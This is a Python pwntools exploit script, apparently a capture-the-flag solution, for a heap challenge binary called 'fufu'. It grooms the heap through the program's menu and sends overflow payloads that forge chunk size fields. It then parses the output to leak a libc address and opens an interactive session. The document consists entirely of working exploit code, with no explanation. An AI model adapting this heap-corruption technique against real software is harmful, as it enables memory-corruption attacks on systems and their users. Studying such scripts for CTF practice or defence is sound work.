#!/usr/bin/python3
import pwn
elf = pwn.context.binary = pwn.ELF("./fufu")
pwn.context.terminal = ['tmux', 'splitw', '-h']
if pwn.args.GDB:
    io = pwn.gdb.debug("./fufu", gdbscript="c\n")
else:
    io = elf.process()


def create(size, content):
    io.sendlineafter(b'do?\n', b'1')
    io.sendlineafter(b'on?\n', b'0')
    io.sendlineafter(b'want?\n', str(size).encode())
    io.sendlineafter(b'content.\n', content)


def display():
    io.sendlineafter(b'do?\n', b'2')
    io.sendlineafter(b'dispaly?\n', b'0')


def reset():
    io.sendlineafter(b'do?\n', b'3')
    io.sendlineafter(b'reset?\n', b'0')


create(0x10, b'aAA')
create(0x40, b'VVV')
create(0x90, b'FFFFFF')

create(0x60, 0x20*b"A")
create(0x200, 0x20*b'B')

create(0x70, b'C'*0x70)
reset()
create(0x70, b'D'*0x70)
reset()
create(0x70, b'G'*0x70)
reset()

payload = b'R'*16
payload += pwn.p64(0x420)
payload += pwn.p64(0x61)
payload += pwn.p64(0)
payload += pwn.p64(0)
create(0x70, payload)
reset()

payload2 = b'B'*0x7e
payload2 += b'\x00'*10
payload2 += pwn.p64(0x421)
create(0x200, payload2)
create(0x60, b'F'*0x8)
create(0xe0, b'WWWWWWWW')

payload3 = b'B'*0x80
create(0x200, payload3)
display()
io.recvline()
io.recvline()
leak = pwn.u64(io.recvline()[-7:-1].ljust(8, b'\0'))
print('libc_leak: ', hex(leak))
io.interactive()
